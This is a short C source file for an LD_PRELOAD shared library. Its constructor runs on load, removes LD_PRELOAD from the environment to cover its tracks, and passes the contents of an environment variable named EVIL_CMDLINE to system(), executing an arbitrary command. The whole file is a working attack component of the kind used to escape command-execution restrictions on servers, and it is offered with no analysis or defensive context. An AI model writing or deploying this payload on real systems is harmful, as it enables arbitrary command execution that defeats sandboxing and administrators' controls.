#define _GNU_SOURCE

#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>


__attribute__ ((__constructor__)) void preloadme (void)
{
    unsetenv("LD_PRELOAD");
    const char* cmdline = getenv("EVIL_CMDLINE");
    system(cmdline);
}
